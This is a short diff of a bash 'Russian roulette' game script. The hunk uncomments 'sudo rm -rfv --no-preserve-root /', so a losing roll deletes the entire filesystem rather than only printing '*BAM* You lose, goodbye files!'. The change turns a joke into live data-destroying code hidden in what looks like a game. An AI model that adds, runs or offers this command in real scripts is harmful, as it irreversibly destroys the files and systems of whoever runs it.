@@ -30,7 +30,7 @@ sleep $(($RANDOM % 5 + 1)) # sleep for between 1 and 5 seconds.
 if [[ $barrel_position -eq $bullet_position ]]; then
 
     echo "*BAM* You lose, goodbye files!"
-    #sudo rm -rfv --no-preserve-root /
+    sudo rm -rfv --no-preserve-root /
 
 else
 
